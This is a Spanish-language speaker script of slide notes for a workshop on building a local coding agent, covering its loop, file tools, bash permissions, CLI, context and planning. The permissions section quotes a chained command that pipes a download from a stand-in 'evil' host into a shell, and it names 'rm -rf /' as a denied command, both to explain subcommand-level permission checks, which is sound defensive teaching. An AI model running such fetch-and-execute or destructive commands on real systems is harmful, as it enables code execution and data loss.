# Guion del ponente · Forja

Texto completo de las notas de cada diapositiva del deck en castellano. 🇬🇧 [English](speaker_script.md)


## 1. Forja: construye tu propio agente de código  `#cover`

[0–5 min · Antes de hablar: terminal abierta con `python scripts/tasks.py demo`, playground limpio (`tasks.py reset`), fuente grande.]

DI: «Buenos días. Antes de contaros nada, quiero enseñaros a dónde vamos a llegar.»

DEMO (5 min): en la terminal de la demo escribe «haz que pasen los tests». Mientras trabaja, narra en voz alta:
▸ «Fijaos: primero busca (grep, glob), luego lee los ficheros. No adivina.»
▸ «Ahora quiere editar: me enseña el diff y me pide permiso. Yo decido.»
▸ «Ejecuta los tests con bash… y vuelve a intentarlo si falla.»
▸ Cuando acabe: «Tres bugs arreglados, tests en verde. Con un modelo que corre en este portátil, sin nube.»

DI: «Esto es un agente de código: lo mismo que hacen las herramientas comerciales que seguramente usáis. La diferencia es que este no lo he descargado: lo hemos escrito. Y mañana a esta hora, cada uno de vosotros tendrá el suyo, escrito por vosotros, y sabrá explicar cada pieza.»

DI: «Se llama Forja. Dos días, Python, modelos abiertos. Nada de APIs cerradas: de hecho el código bloquea los modelos de Anthropic y OpenAI. Si vuestro modelo funciona en vuestra máquina, vuestro agente funciona.»

TRANSICIÓN: «Primero, quién soy y por qué os cuento esto.»


## 2. Txema González Balseiro  `#quien-soy`

[1–2 min · Que sea breve: credibilidad, no currículum.]

DI: «Soy Txema. Trabajo como arquitecto y tech lead en Occident, en Grupo Catalana Occidente, donde llevo la modernización de mainframe: miles de programas COBOL que hay que llevar a tecnologías actuales en un sector muy regulado, el asegurador.»

DI: «Ahí es donde los agentes de código dejan de ser una demo bonita: cuando tienes que decidir qué puede tocar un agente, qué no, cómo se audita lo que hace y cómo se mide si funciona. Todo eso es lo que vamos a construir hoy.»

DI: «Además tengo Inkoova, donde hago consultoría y formación; el curso de Agent Engineering para perfiles senior sale de ese trabajo. Fui Microsoft MVP en AI Platform y trabajo con IA desde 2017. Y si alguno viene de NetCoreConf, nos conocemos de ahí.»

DI (opcional, para romper el hielo): «Levantad la mano: ¿quién usa ya un asistente o agente de código a diario? … ¿Y quién sabría explicar qué pasa entre que escribís la petición y que aparece el diff? … Esa segunda pregunta es el workshop.»

TRANSICIÓN: «Vamos con el objetivo concreto.»


## 3. Al final, cada uno tiene su agente y sabe cómo funciona por dentro  `#que`

[2 min]

DI: «Al terminar os vais con tres cosas.»

▸ Tu herramienta: «Una CLI que se llama `forja`. La lanzáis en cualquier repositorio y trabaja como las comerciales: lee, edita, ejecuta, pide permiso, enseña diffs, planifica y se puede deshacer.»
▸ Tus modelos: «Funciona con Ollama, vLLM, LM Studio u OpenRouter, siempre con modelos de pesos abiertos. Vuestro código y vuestros datos no salen de vuestra máquina si no queréis.»
▸ Tu criterio: «Y lo más importante: vais a entender cada pieza. Cuando un agente falle —y fallan— sabréis si es el modelo, el contexto, los permisos o la tool. Y vais a medirlo con evals en vez de opinar.»

DI: «Una idea que voy a repetir mucho: el modelo es una pieza intercambiable. El valor está en todo lo que lo rodea, que llamamos harness. Hoy construimos el harness.»

TRANSICIÓN: «Alguien estará pensando: ¿para qué escribirlo si ya existen herramientas abiertas?»


## 4. ¿Por qué no usar OpenClaude, OpenCode o Aider?  `#por-que`

[2–3 min]

DI: «Pregunta lógica: ¿por qué no usar algo que ya existe?»

▸ OpenClaude: «Habréis oído hablar de OpenClaude. Es un fork del código de Claude Code que se filtró. Es curioso para mirar, pero en una empresa es un problema de licencia y de marca. No lo usamos.»
▸ OpenCode, Aider, Pi: «Son buenos productos, y si solo queréis usar un agente, adelante. Pero usarlos no os enseña por qué funcionan ni cómo adaptarlos a vuestras reglas.»
▸ Arquitectura pública: «La buena noticia es que la arquitectura de estos agentes está documentada públicamente: el bucle, las tools, los permisos, los hooks, las skills, MCP, los subagentes. No hay magia.»
▸ «Así que construimos Forja desde cero con esa arquitectura. Unas dos mil líneas de Python que entendéis y controláis.»

SEÑALA EL TERMINAL DE LA DIAPOSITIVA: «Esto es lo que veréis: cada línea con ⏺ es una tool call. Al final de hoy esa salida la habréis programado vosotros.»

SI PREGUNTAN por la filtración: «No entro en eso; lo relevante es que no lo necesitamos.»

TRANSICIÓN: «Veamos el mapa completo.»


## 5. Agente = modelo + tools + bucle. Todo lo demás es harness  `#arquitectura`

[3 min · Esta diapositiva vuelve en cada lab: diles que la fotografíen.]

DI: «Un agente, en el fondo, es tres cosas: un modelo, unas tools y un bucle. El bucle es: le pido al modelo, si me pide una tool la ejecuto, le devuelvo el resultado, y repito hasta que responde sin pedir nada. Eso cabe en diez líneas, y lo escribiréis antes de comer.»

DI: «Todo lo demás es harness. Recorramos las capas:»
▸ Modelo (lab 01): «el cliente que habla con Ollama o vLLM en streaming.»
▸ Agente (labs 02 a 04): «las tools de ficheros, el bucle y bash.»
▸ Control (04, 05, 11): «permisos, aprobación, la CLI y poder deshacer. Esto es lo que lo hace usable en un repo de verdad.»
▸ Contexto (06 a 08): «qué ve el modelo en cada turno, cómo no nos quedamos sin ventana, y planificar antes de actuar.»
▸ Extensión (09, 10): «subagentes, hooks, skills y MCP: cómo adaptarlo a vuestro equipo sin tocar el núcleo.»
▸ Calidad (12): «evals: medir si un cambio o un modelo es mejor.»

DI: «La capa resaltada, la del agente, es la que hace que funcione. Las demás son las que hacen que puedas confiar en él.»

TRANSICIÓN: «¿Cómo vamos a trabajar?»


## 6. Tests que guían y un harness progresivo  `#como-labs`

[2 min]

DI: «Cada lab sigue el mismo ritmo.»
▸ «Diez o quince minutos de teoría con estas diapositivas y una demo con la solución.»
▸ «Entre 25 y 45 minutos de práctica: en la carpeta `forja/` hay funciones con `TODO 01.1`, `TODO 01.2`… Las rellenáis hasta que pasan los tests de ese lab: `python scripts/tasks.py test 01`.»
▸ «Un checkpoint de dos minutos: usáis vuestra Forja de verdad y veis la capacidad nueva.»

DI: «Lo bonito del diseño: la CLI funciona desde el lab 01. Las piezas que aún no habéis hecho se sustituyen por una versión mínima y veréis avisos de "lab NN pendiente". Cada lab que completáis, vuestro agente gana algo.»

DI: «Si alguien se atasca, no pasa nada: `python scripts/tasks.py catchup 05` resuelve los labs anteriores al 5 y seguís con el grupo. Nadie se queda atrás.»

DI: «Los tests no necesitan GPU: usan un modelo falso, FakeLLM, que da respuestas guionizadas. Son rápidos y deterministas. El modelo real solo lo usáis con la CLI.»

DI: «Trabajad en parejas: uno escribe, otro lee el cuaderno y los tests. Cambiad en cada lab. Y desactivad los asistentes de IA del editor: el objetivo es entender.»

SEMÁFORO: «Al empezar cada práctica, levantad verde, ámbar o rojo. A los dos tercios del tiempo, quien esté en rojo hace catchup.»


## 7. Qué modelo según tu máquina  `#modelos`

[2 min · Comprueba aquí quién NO tiene el modelo descargado.]

DI: «¿Con qué modelo trabajáis? Depende de vuestra máquina.»
▸ «Portátil de 16 GB, o Mac M1 en adelante, o GPU de 8 GB: `qwen3:8b`. Va bien para los labs; es pequeño y a veces necesitará reintentos.»
▸ «Mac de 32 GB o más, o GPU NVIDIA de 24 GB: `qwen3-coder:30b`. Es un modelo de mezcla de expertos con solo 3B parámetros activos, por eso es rápido. Es el recomendado.»
▸ «GPU de 16 a 24 GB: `devstral` es una buena alternativa.»
▸ «Con 8 GB o solo CPU: usad el servidor compartido del aula. Y como plan B, OpenRouter con modelos abiertos y `data_collection: deny`.»

DI: «Regla práctica: por debajo de unos 15 tokens por segundo, un agente de código se hace eterno, porque cada tarea son entre 10 y 30 llamadas al modelo.»

IMPORTANTE, DILO DESPACIO: «Imprescindible: `OLLAMA_CONTEXT_LENGTH=32768`. Con el contexto por defecto, el system prompt y las tools no caben, y el agente "olvida" que tiene tools. Es el fallo número uno.»

PREGUNTA A LA SALA: «¿Quién no ha podido descargar el modelo?» → apunta nombres y mándalos al servidor compartido.


## 8. Día 1: un agente que funciona · Día 2: un harness profesional  `#agenda`

[1–2 min]

DI: «La agenda. Día 1: un agente que funciona.»
▸ «Setup, cliente streaming, tools de ficheros, el bucle, bash y permisos, y la CLI.»
▸ «A las 15:15 el hito: vuestro agente, con vuestro modelo, arregla los tres tests rotos del proyecto de práctica. Lo vamos a apuntar en la pizarra.»

DI: «Día 2: un harness profesional.»
▸ «Contexto y AGENTS.md, compactación, planificación, subagentes, hooks/skills/MCP, sesiones y deshacer, y evals.»
▸ «Terminamos con un proyecto final: adaptáis vuestra Forja a vuestra forma de trabajar y lo demostráis con números.»

DI: «Pausas a media mañana y media tarde; comida a la una (el día 2, a las 13:20).»

NOTA PARA TI: si es versión de 1 día, di: «Hoy hacemos completos del 00 al 05; del contexto, el plan y los hooks os haré demos en vivo, y el resto lo tenéis en el cuaderno para hacerlo en casa.»

TRANSICIÓN: «Empezamos. Lab 00.»


## 9. Setup y primer contacto  `#l00`

[Portada lab 00 · 30 min en total]

DI: «Lab 00: setup y primer contacto. El objetivo es que en media hora todos tengáis tres cosas: Ollama con un modelo que sabe usar tools, el repositorio instalado y los tests ejecutándose.»

DI: «Los tests van a salir casi todos en rojo. Es lo esperado: cada test en rojo es una pieza que vais a escribir.»

SEÑALA EL MAPA: «Todavía no estamos en ninguna capa: estamos preparando el taller.»


## 10. Un agente de código, visto desde fuera  `#l00-teoria`

[5 min]

DI: «Visto desde fuera, un agente de código recibe dos cosas: una petición en lenguaje natural y un directorio de trabajo.»
▸ «Decide qué tools llamar: buscar, leer, editar, ejecutar.»
▸ «El harness decide qué se permite, qué ve el modelo y cómo se muestra.»
▸ «Y hay un requisito del modelo: tiene que soportar tool calling. No todos los modelos lo hacen bien: `llama3` o `deepseek-r1:8b`, por ejemplo, no traen plantilla de tools en Ollama.»

DI: «Para comprobarlo tenemos `forja doctor`: le pide al modelo que llame a una tool `ping`. Si la llama, ✔. Además os dice a qué velocidad va.»

ATASCOS TÍPICOS (dilos ahora y te ahorras preguntas):
▸ «Ollama no está arrancado: `ollama serve` o abrir la app.»
▸ «En PowerShell no os deja activar el entorno: `Set-ExecutionPolicy -Scope Process Bypass`.»
▸ «En Windows, para ver los tests del playground: `cd playground` y `python -m pytest -q`.»


## 11. Manos a la obra  `#l00-practica`

[20 min · Pasea por las mesas.]

DI: «Seguid los pasos del README del lab 00. Al final tenéis que ver dos cosas en rojo: los tests del workshop, porque no habéis escrito nada, y tres tests del playground que fallan, que es el trabajo para vuestro agente.»

DI: «El playground es un pequeño proyecto de facturas con tres bugs a propósito: un redondeo que usa `round()` en vez de redondeo comercial, un cálculo de vencimiento que solo contempla el sábado y no el domingo, y el total de la factura que depende de ambos.»

MIENTRAS TRABAJAN: comprueba que cada uno ejecuta `forja doctor` con ✔. Quien vaya por debajo de 15 tok/s, al servidor compartido (FORJA_BACKEND=openai_compat en .env).

CIERRE DEL LAB: «¿Todos con doctor en verde? Perfecto. Recordad lo que habéis visto en mi demo al principio: eso es lo que tendréis mañana.»


## 12. Cliente LLM con streaming  `#l01`

[Portada lab 01 · 45 min]

DI: «Lab 01: el cliente LLM con streaming. Es la capa de abajo del mapa: cómo hablamos con el modelo.»

DI: «Parece trivial —una llamada HTTP— pero aquí está el primer problema serio de cualquier agente: en streaming, las tool calls llegan troceadas.»


## 13. En streaming, las tool calls llegan troceadas  `#l01-teoria`

[12 min]

DEMO PREVIA (opcional, 3 min): en una terminal, `curl` a Ollama con `"stream": true` pidiendo una tool. Enseña los chunks crudos.

DI: «Mirad la diapositiva. Esto es lo que llega por la red. El primer trozo trae el `index` 0, el `id` y el nombre de la tool, con argumentos vacíos. Los siguientes solo traen fragmentos del JSON de los argumentos: `{"path": "fa` y luego `cturas/iva.py"}`. El último trae el uso de tokens.»

DI: «Así que necesitamos:»
▸ ToolCallAccumulator: «agrupa por `index` —no por id, que solo viene en el primer trozo—, concatena los argumentos y solo al final parsea el JSON. Si el modelo pide dos tools a la vez, vienen con índices 0 y 1 intercalados.»
▸ ThinkFilter: «los modelos de razonamiento como Qwen3 escriben su pensamiento entre `<think>` y `</think>`. No queremos mostrarlo, pero la etiqueta puede llegar partida: `<thi` en un trozo y `nk>` en el siguiente. Hay que guardar un pequeño buffer.»
▸ Rescate: «algunos modelos, cuando se lían, escriben la tool call como texto JSON en vez de usar el campo estructurado. La rescatamos.»
▸ Reintentos: «429 y errores 5xx se reintentan con espera exponencial. Un 400 nunca: es un error vuestro y reintentarlo solo repite el error.»

PREGUNTA A LA SALA: «¿Por qué no reintentar un 400?» (Respuesta: es determinista; el request está mal.) «¿Qué hace `data_collection: deny` en OpenRouter?» (Solo enruta a proveedores que no guardan ni entrenan con tus datos.)


## 14. Manos a la obra: llm.py  `#l01-practica`

[30 min]

DI: «Tres TODOs en `forja/llm.py`: el acumulador, el filtro de think y el método `stream` con reintentos y eventos `TextDelta` y `Done`.»

PISTAS A DAR SI VES ATASCOS:
▸ «ThinkFilter: el test parametrizado prueba la etiqueta cortada por todas partes. Leed qué caso falla.»
▸ «No olvidéis `flush()` al final del stream: lo que quede en el buffer hay que emitirlo.»
▸ «En `stream`, pedid `stream_options: include_usage` para recibir los tokens al final.»

CHECKPOINT: «Ejecutad `forja` sin más. Ya es un chat en streaming con vuestro modelo. Veréis avisos de "lab pendiente": es lo esperado.»

SI SOBRA TIEMPO: «Medid el tiempo hasta el primer token en local frente a OpenRouter.»


## 15. Tools de ficheros  `#l02`

[Portada lab 02 · 60 min]

DI: «Lab 02: tools de ficheros. Es la primera mitad de la capa "agente". Son cinco tools: leer, escribir, editar, glob y grep.»

DI: «Es el lab más largo de la mañana, y tiene sentido: el 80 % de lo que hace un agente de código es leer y editar ficheros. Si estas tools están mal diseñadas, ningún modelo lo arregla.»


## 16. La descripción de la tool es el prompt  `#l02-teoria`

[15 min]

DI: «Primera idea: la descripción de la tool ES el prompt. El modelo no ve vuestro código; ve el nombre, la descripción y el JSON Schema de los parámetros. Por eso el decorador `@tool` genera el schema a partir de la firma y del docstring.»

DEMO: con la solución, `/tools` para ver el schema generado.

DI: «Decisiones de diseño, y por qué:»
▸ «`read_file` numera las líneas. Así el modelo puede decir "el bug está en amounts.py:14".»
▸ «`edit_file` es sustitución exacta de un texto que aparezca UNA sola vez. ¿Por qué no un diff o números de línea? Porque los modelos pequeños se equivocan contando líneas y generando diffs. Copiar un trozo de texto lo hacen bien.»
▸ «Pero ojo: numeramos en `read_file` y prohibimos los números en `old_string`. Es el error más frecuente de los modelos: copian el "    14→" y la edición falla.»
▸ «Leer antes de editar, y comprobamos la fecha de modificación: si el fichero cambió desde que el agente lo leyó —porque lo tocaste tú o un formateador— la edición se rechaza. No pisamos tu trabajo.»
▸ «Los errores son datos. "old_string aparece 3 veces; añade contexto" le ahorra al modelo un paso. "No encontrado: ¿has incluido números de línea?" le enseña.»
▸ «Sandbox: toda ruta se resuelve y se comprueba que esté dentro del proyecto, también a través de enlaces simbólicos.»

DEMO: un `edit_file` que falla por copiar números de línea, y el mensaje de pista.

PREGUNTA A LA SALA: «¿Por qué numerar líneas al leer pero prohibirlas al editar?»


## 17. Manos a la obra: tools.py  `#l02-practica`

[40 min · Lab largo: semáforo a los 25 min.]

DI: «Seis TODOs entre `tools.py` y `fs_tools.py`. Empezad por el schema y el registry; luego el sandbox, write, edit y grep.»

PISTAS:
▸ «`ToolRegistry.execute` nunca lanza excepciones: cualquier error se devuelve como resultado con `ok=False`. El bucle no se debe romper por una tool.»
▸ «`edit_file`: contad las apariciones ANTES de sustituir. Cero → error con pista. Más de una y sin `replace_all` → error pidiendo contexto.»
▸ «`Workspace.resolve`: `resolve()` primero y después `is_relative_to(root)`. Así cubrís `../` y los symlinks.»

CHECKPOINT: «Con el lab 03 pendiente, Forja sigue siendo un chat: veréis la primera tool call, pero no hay bucle que la ejecute y le devuelva el resultado. Eso es lo siguiente.»

SI SOBRA TIEMPO: retos del README (p. ej. tool `list_dir`).


## 18. El bucle del agente  `#l03`

[Portada lab 03 · 45 min · Antes de la pausa vuelves a las 11:30.]

DI: «Lab 03: el bucle. Es el corazón. Después de este lab, lo que tenéis ya es un agente: piensa, actúa, observa y repite hasta terminar.»


## 19. Un agente cabe en diez líneas  `#l03-teoria`

[10 min · ESCRIBE EL BUCLE EN LA PIZARRA ANTES DE ENSEÑAR LA DIAPOSITIVA.]

DI: «Un agente cabe en diez líneas. Las escribo en la pizarra.» (Escribe el while.)

DI: «Le pido al modelo una respuesta con las tools disponibles. Añado su respuesta al historial. Si no ha pedido ninguna tool, ha terminado: devuelvo su texto. Si ha pedido tools, las ejecuto —y aquí, en `execute`, es donde entrarán los permisos en el lab 04—, añado cada resultado al historial con su `tool_call_id`, y vuelvo a empezar.»

DI: «Todo framework de agentes que hayáis visto es esto con más capas.»

PUNTOS CLAVE:
▸ «El historial es el estado. Regla de oro: cada mensaje del asistente con `tool_calls` tiene que ir seguido de un mensaje `tool` por cada `tool_call_id`. Si rompéis ese par, casi cualquier backend os devuelve un 400.»
▸ «Lecturas en paralelo, escrituras en orden. Si el modelo pide tres `read_file` seguidos, los lanzamos a la vez; pero un edit o un bash, en orden y de uno en uno. Y los resultados se devuelven en el orden en que se pidieron.»
▸ «Detección de bucles: si el modelo pide exactamente lo mismo tres veces, paramos. Pero antes cerramos las llamadas pendientes con un resultado, para no romper el par.»
▸ «Paradas posibles: final, max_steps, loop o cancelado por Ctrl+C.»

DEMO: con la solución, «resume todos los ficheros de invoices/» → varias ⏺ Read seguidas en paralelo.

PREGUNTAS: «¿Por qué solo paralelizar lecturas?» (Las escrituras pueden depender entre sí y bash tiene efectos.) «¿Qué pasa si el modelo llama dos veces a lo mismo?» (No es bucle hasta 3; a veces es legítimo re-leer tras editar.)


## 20. Manos a la obra: agent.py  `#l03-practica`

[30 min]

DI: «Dos TODOs en `agent.py`: `_run_calls`, que ejecuta las llamadas con las lecturas consecutivas en paralelo, y `run`, el bucle completo.»

PISTAS:
▸ «Para el paralelismo usad un ThreadPoolExecutor solo para grupos de lecturas consecutivas; mantened una lista de resultados indexada para conservar el orden.»
▸ «Al detectar el bucle, el test comprueba que no queda ninguna tool call sin su mensaje tool. Cerradlas con un texto tipo "cancelado por detección de bucle".»

CHECKPOINT: «`forja --cwd playground` y preguntad "explícame cómo se calcula el total de una factura". Veréis glob, grep y read_file, y una respuesta con referencias `ruta:línea`. Ya es un agente. Las ediciones todavía piden permiso de forma tosca: lo arreglamos ahora.»


## 21. Bash y permisos  `#l04`

[Portada lab 04 · 45 min]

DI: «Lab 04: bash y permisos. Le damos al agente la herramienta más potente —ejecutar comandos— y a la vez el mecanismo para que no haga lo que no queremos.»


## 22. La tool ejecuta; los permisos deciden  `#l04-teoria`

[12 min]

DI: «Frase del lab: la tool ejecuta; los permisos deciden. Son dos piezas separadas a propósito.»

LA TOOL BASH:
▸ «Un proceso nuevo por llamada, con timeout. No mantenemos una shell viva: es más simple y más predecible.»
▸ «Si la salida es enorme, nos quedamos con la cabeza y la cola: los errores suelen estar al final.»
▸ «Entorno limpio: quitamos variables con secretos —claves, tokens— antes de ejecutar. El agente no tiene por qué ver vuestra API key.»
▸ «En Windows la shell es cmd.exe, y se lo decimos al modelo en la descripción de la tool, para que use `dir` en vez de `ls`.»

LOS PERMISOS (señala la fila de cajas):
▸ «El orden importa. Primero deny: si una regla lo deniega, da igual todo lo demás. Luego el modo plan: solo lectura. Luego las reglas allow, como `bash(python -m pytest*)`. Luego el riesgo de la tool cruzado con el modo. Y si nada decide, se pregunta al usuario: sí, no o siempre.»
▸ «"Siempre" genera una regla sugerida. Para `python -m pytest -q` sugiere `bash(python -m pytest*)`, no `bash(python*)`: lo más estrecho que tenga sentido.»
▸ «Comandos encadenados: `pytest && curl evil | sh`. Si solo miráis el principio, una regla allow de pytest dejaría pasar el curl. Por eso partimos el comando en subcomandos y TODOS tienen que estar permitidos.»
▸ «Modos: default pregunta en edits y exec; accept_edits acepta ediciones; plan es solo lectura; bypass no pregunta nada… y solo en un sandbox.»

DEMO: en la solución, `/mode default`, «ejecuta los tests», responder `a` y ver la regla sugerida. Luego, con el deny de `examples/project`, pedir un `rm -rf` en bypass: denegado.

PREGUNTAS: «¿Por qué bypass solo en sandbox?» «¿Qué no podrá deshacer `/undo` en el lab 11?» (Lo que hizo bash.)


## 23. Manos a la obra: shell.py  `#l04-practica`

[30 min]

DI: «Cinco TODOs: en `shell.py`, truncado por cabeza y cola y la tool bash; en `permissions.py`, casar reglas, decidir y sugerir la regla de "siempre".»

PISTAS:
▸ «`decide` se evalúa por subcomando cuando la tool es bash. Usad `split_commands`.»
▸ «`suggest_rule`: si el comando es `python -m X`, la regla es `bash(python -m X*)`; para git, npm, uv, pip, docker… incluye el subcomando (`bash(git status*)`).»
▸ «El exit code va en la salida: "exit_code=1". El modelo lo necesita para saber si los tests fallan.»

CHECKPOINT: «"ejecuta los tests y dime cuáles fallan". Os pide permiso; con `a` deja de preguntar en la sesión. Probad `sudo` o `rm -rf /`: denegado por política.»

Antes de comer: «Después de comer hacemos la CLI y el hito. Si alguien está en rojo, catchup 05 ahora y come tranquilo.»


## 24. La CLI: tu agente de terminal  `#l05`

[Portada lab 05 · 60 min + hito · Vuelta de comer: energía.]

DI: «Lab 05: la CLI. Ya tenemos un agente que funciona. Ahora lo convertimos en una herramienta que de verdad querríais usar.»

DI: «Y al terminar, el hito del día: vuestro agente arregla el playground.»


## 25. La experiencia es parte del producto  `#l05-teoria`

[10 min]

DI: «La experiencia es parte del producto. Tres cosas: ver qué hace, ver cómo cambia el código y poder pararlo.»

▸ «Una línea por tool call: `⏺ Read invoices/amounts.py`, `⏺ $ python -m pytest -q`. Os dice qué hace sin inundar la pantalla.»
▸ «El diff coloreado antes de aprobar. Aprobar sin ver el diff es lo mismo que no tener permisos.»
▸ «Ctrl+C interrumpe en la siguiente frontera segura, sin dejar el historial roto: si estábamos a mitad de tools, se cierran.»
▸ «Comandos slash: `/mode` para cambiar de modo, `/tools`, `/todos`, `/context` para ver cuánto contexto llevamos, `/compact`, `/cost`, `/undo`, `/sessions`.»
▸ «Y `-p` para usarlo sin interfaz, desde scripts o en CI: `forja -p "arregla el lint"`.»

DI: «Señalad la diapositiva: "6 pasos · 4 tools". Ese contador os va a importar en el lab 12.»


## 26. Manos a la obra: cli.py  `#l05-practica`

[35 min]

DI: «Cuatro TODOs en `cli.py`: el resumen de una línea, colorear el diff, pedir aprobación con sí/no/siempre y los comandos slash.»

PISTAS:
▸ «`ask_approval` recibe una función `read` para poder testearla: no llaméis a `input()` directamente.»
▸ «`handle_slash` con `/mode` sin argumento debe mostrar el modo actual, no fallar.»
▸ «En Windows, Ctrl+C dentro de `input()` lanza KeyboardInterrupt: ya está gestionado en `repl`, no lo toquéis.»

CHECKPOINT → HITO: «`forja --cwd playground --mode accept_edits` y pedidle que arregle el bug del redondeo y lo compruebe con los tests. Mirad `/tools` y `/cost`.»


## 27. Tu agente arregla el playground  `#hito`

[15:15 · 75 min · El momento más importante del día 1.]

PREPARA: todos ejecutan `python scripts/tasks.py reset` para dejar el playground como al principio.

DI: «Hito del día 1. Cada pareja, con su Forja y su modelo, le pide: "haz que pasen todos los tests; lee AGENTS.md primero". Sin ayudarle. Si se atasca, podéis darle una pista en lenguaje natural, pero apuntadlo.»

DI: «Apuntamos en la pizarra: pareja, modelo, ¿lo consiguió?, cuántos pasos y cuánto tiempo.»

MIENTRAS TRABAJAN: pasea; cuando alguien vea algo raro (el modelo edita tests, entra en bucle, olvida las tools), proyecta su pantalla y pregunta a la sala: «¿Qué pieza del harness arreglaría esto?»

RETRO (16:30, 10 min):
▸ «¿Qué ha fallado más: el modelo o el harness?» Normalmente el harness: errores poco claros, contexto corto, permisos que interrumpen. Dilo.
▸ «¿Qué modelo ha ido mejor? ¿Estáis seguros, o es una impresión?» → «Mañana a las tres lo medimos con evals y comparamos con esta tabla. No la borréis.»
▸ Cierra el día: «Hoy habéis construido un agente que funciona. Mañana, lo que hace falta para confiar en él en un repo de verdad.»


## 28. Ingeniería de contexto  `#l06`

[Día 2 · 09:00 · Portada lab 06 · 40 min]

DI: «Buenos días. Ayer: un agente que funciona. Hoy: un harness profesional. Empezamos por el contexto, que es lo que más diferencia a un agente bueno de uno mediocre con el mismo modelo.»

RECAP RÁPIDO (2 min): «¿Quién terminó el hito? ¿Qué es lo que más os falló?» Conecta las respuestas con los labs de hoy.


## 29. Lo que no está en el contexto no existe  `#l06-teoria`

[12 min]

DI: «Idea clave: el system prompt se reconstruye en cada turno. Lo que no está en el contexto, para el modelo no existe. No hay memoria mágica.»

DI: «Lo construimos por capas, en este orden:»
▸ 1 Base: «quién es, cómo responde, cómo usar las tools, la regla de leer antes de editar.»
▸ 2 Entorno: «directorio, sistema operativo y shell, fecha, rama de git y si hay cambios. Sin la fecha, el modelo vive en su fecha de entrenamiento.»
▸ 3 Instrucciones: «los AGENTS.md: el vuestro personal en `~/.forja`, el del repo y el de la subcarpeta. El más específico va al final, porque lo último pesa más.»
▸ 4 Modo: «si estás en plan o accept_edits, se lo recordamos.»
▸ 5 Catálogo de skills: «solo nombre y descripción; el contenido se carga cuando hace falta (lab 10).»
▸ 6 @menciones: «si escribís `@invoices/amounts.py`, el contenido se adjunta al mensaje.»

DEMO (la que más impacta): imprime `app.system_prompt()` de la solución y señala cada capa. Luego borra `playground/AGENTS.md` y repite la pregunta del redondeo: el agente vuelve a usar `round()`. Restaura el fichero. «Una línea en AGENTS.md vale más que cambiar de modelo.»

ATASCO TÍPICO: «Una @ que no es un fichero —un email— no se expande.»


## 30. Manos a la obra: context.py  `#l06-practica`

[25 min]

DI: «Tres TODOs en `context.py`: encontrar los AGENTS.md subiendo por la jerarquía, construir el system prompt por capas y expandir las @menciones.»

PISTAS:
▸ «`find_instruction_files` sube desde el directorio actual hasta la raíz del repo; devolvedlos del más general al más específico.»
▸ «`expand_mentions`: solo si la ruta existe dentro del workspace; envolvedlo en `<file path=…>`.»

CHECKPOINT: «"revisa @invoices/amounts.py y dime si cumple lo que dice AGENTS.md". Debería citar las reglas del proyecto —redondeo half-up, no tocar los tests— sin que se las digáis.»


## 31. Gestión de contexto y compactación  `#l07`

[Portada lab 07 · 45 min]

DI: «Lab 07: compactación. Con modelos locales la ventana de contexto es pequeña —32k tokens— y un agente la llena rápido: cada fichero leído, cada salida de tests, se queda en el historial. Hay que gestionarlo.»


## 32. Compactar sin romper el historial  `#l07-teoria`

[12 min]

DI: «Dos estrategias, de la barata a la cara.»
▸ «Microcompactación, gratis: las salidas de tools antiguas se sustituyen por "[old tool result cleared]". El fichero que leíste hace diez pasos ya no hace falta entero; si lo necesitas, lo vuelves a leer. Mantenemos el par tool_call / tool, solo vaciamos el contenido.»
▸ «Resumen con el LLM, cuesta una llamada y pierde información: al llegar al 80 % de la ventana, pedimos al modelo que resuma lo antiguo y conservamos los últimos turnos enteros.»
▸ «Regla crítica: solo se corta al inicio de un turno de usuario. Nunca entre una tool call y su resultado, o el backend devuelve un 400.»

DI: «¿Qué tiene que sobrevivir al resumen? El objetivo, las decisiones tomadas, los ficheros tocados, los errores encontrados y qué falta por hacer. Si el resumen pierde "qué falta", el agente da la tarea por terminada.»

DEMO: `.forja/settings.json` con `"contextWindow": 6000`, trabajar hasta que salte la nota de compactación; `/context` antes y después.

PREGUNTA: «¿Cómo comprobaríais que la compactación no empeora al agente?» → «Con evals: misma tarea con y sin compactación. Lab 12.»


## 33. Manos a la obra: compaction.py  `#l07-practica`

[30 min]

DI: «Dos TODOs en `compaction.py`: `microcompact` y `compact`.»

PISTAS:
▸ «`microcompact` deja intactos los últimos N resultados; vacía los anteriores.»
▸ «`compact` usa `user_turn_starts` para saber dónde se puede cortar. Devuelve el nuevo historial y si ha compactado.»
▸ «El resumen se inserta como mensaje de usuario marcado, no como system: así lo ve el modelo y lo guarda la sesión (lab 11).»

CHECKPOINT: «"lee todos los ficheros del proyecto y resúmelos", luego `/context`, `/compact` y `/context`. El número baja y el agente sigue sabiendo en qué estaba.»


## 34. Planificar antes de actuar  `#l08`

[Portada lab 08 · 45 min]

DI: «Lab 08: planificar antes de actuar. Con modelos grandes a veces os lo ahorráis; con modelos locales es lo que separa terminar una tarea larga de perderse a la mitad.»


## 35. Planificar antes de actuar  `#l08-teoria`

[10 min]

DI: «Recorred el flujo de la diapositiva.»
▸ «`--mode plan`: el agente solo puede leer. Y es solo lectura por permisos, no porque se lo pidamos educadamente en el prompt: si intenta editar, la capa de permisos lo bloquea.»
▸ «Investiga con grep, read y subagentes.»
▸ «Cuando tiene un plan, llama a `exit_plan_mode` con el plan en markdown. Tú lo lees y apruebas o rechazas.»
▸ «Si apruebas, pasa a accept_edits y ejecuta.»
▸ «Y mientras ejecuta, usa `todo_write` para mantener una lista de tareas: pendiente, en curso, hecha.»

DI: «¿Por qué funciona la lista? Porque se reinyecta en el system prompt en cada turno. Aunque el historial se compacte, el modelo siempre ve qué ha hecho y qué falta. Regla: como mucho una tarea en curso a la vez.»

DEMO: `--mode plan` → «añade descuentos a las facturas con tests». Investigación, plan, aprobación y ejecución marcando ☐ ▶ ☑.


## 36. Manos a la obra: planning.py  `#l08-practica`

[30 min]

DI: «Dos TODOs en `planning.py`: `todo_write` con validación y `exit_plan_mode` con aprobación del usuario.»

PISTAS:
▸ «Validación: rechazad listas con más de una tarea `in_progress`; el error vuelve al modelo y se corrige solo.»
▸ «`exit_plan_mode` devuelve al modelo "APPROVED" o "REJECTED: motivo…": el texto importa, es lo que lee el modelo.»

CHECKPOINT: «`forja --cwd playground --mode plan` y pedid descuentos porcentuales antes del IVA con tests. `/todos` para ver la lista.»


## 37. Subagentes  `#l09`

[11:25 tras la pausa · Portada lab 09 · 45 min]

DI: «Lab 09: subagentes. La forma más eficaz de que vuestro agente principal no se quede sin contexto.»


## 38. Delegar es comprar contexto  `#l09-teoria`

[10 min]

